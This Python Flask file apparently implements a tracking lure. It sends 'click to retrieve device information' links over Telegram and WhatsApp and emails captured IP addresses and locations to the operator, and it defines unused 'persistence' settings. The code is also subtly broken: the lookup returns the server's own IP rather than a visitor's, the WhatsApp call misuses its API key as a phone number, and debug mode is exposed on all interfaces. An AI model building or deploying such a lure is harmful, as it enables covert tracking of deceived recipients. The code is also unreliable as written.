# app.py

import os
from flask import Flask, request, jsonify
import smtplib
import requests
from dotenv import load_dotenv

# Load environment variables from a custom file named config.env
load_dotenv("config.env")

# Configuration Settings
APP_NAME = "App"  # Application name changed to "App"
DEBUG = True

# Server settings
SERVER_HOST = "0.0.0.0"  # Listen on all available IP addresses
SERVER_PORT = 5000

# Email configuration
EMAIL_HOST = os.getenv("EMAIL_HOST", "smtp.gmail.com")
EMAIL_PORT = int(os.getenv("EMAIL_PORT", 587))
EMAIL_USER = os.getenv("EMAIL_USER", "your-email@gmail.com")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "your-password")

# WhatsApp and Telegram settings
WHATSAPP_API_KEY = os.getenv("WHATSAPP_API_KEY", "your-whatsapp-api-key")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "your-telegram-bot-token")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "your-telegram-chat-id")

# IP and Location Tracking API
IP_API_URL = "https://ipinfo.io/json"
GEO_API_KEY = os.getenv("GEO_API_KEY", "your-geo-api-key")

# Persistence settings
PERSISTENCE_INTERVAL = int(os.getenv("PERSISTENCE_INTERVAL", 60))

# Flask app initialization
app = Flask(APP_NAME)

# Function to send email with captured information
def send_email(subject, body):
    try:
        with smtplib.SMTP(EMAIL_HOST, EMAIL_PORT) as server:
            server.starttls()
            server.login(EMAIL_USER, EMAIL_PASSWORD)
            message = f"Subject: {subject}\n\n{body}"
            server.sendmail(EMAIL_USER, EMAIL_USER, message)
        print("Email sent successfully.")
    except Exception as e:
        print("Error sending email:", e)

# Endpoint to retrieve IP and location
@app.route('/get_info', methods=['GET'])
def get_info():
    try:
        response = requests.get(IP_API_URL)
        data = response.json()
        ip_address = data.get("ip", "N/A")
        location = data.get("loc", "N/A")
        info = f"IP Address: {ip_address}, Location: {location}"
        
        # Send the info via email
        send_email("Device IP and Location", info)
        
        return jsonify({"status": "success", "info": info})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# Function to send a message with a link via Telegram
def send_telegram_message(message, link):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": f"{message} {link}"
    }
    requests.post(url, json=payload)

# Function to send a WhatsApp message (assumes a WhatsApp API provider)
def send_whatsapp_message(message, link):
    url = f"https://api.whatsapp.com/send?phone={WHATSAPP_API_KEY}"
    payload = {
        "body": f"{message} {link}"
    }
    headers = {
        "Authorization": f"Bearer {WHATSAPP_API_KEY}"
    }
    requests.post(url, json=payload, headers=headers)

# Endpoint to trigger messages to WhatsApp and Telegram
@app.route('/send_link', methods=['POST'])
def send_link():
    data = request.get_json()
    link = data.get("link", "https://example.com/retrieve")
    message = "Click to retrieve device information:"

    # Send messages
    send_telegram_message(message, link)
    send_whatsapp_message(message, link)

    return jsonify({"status": "success", "message": "Links sent to WhatsApp and Telegram."})

# Run the app
if __name__ == "__main__":
    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=DEBUG)
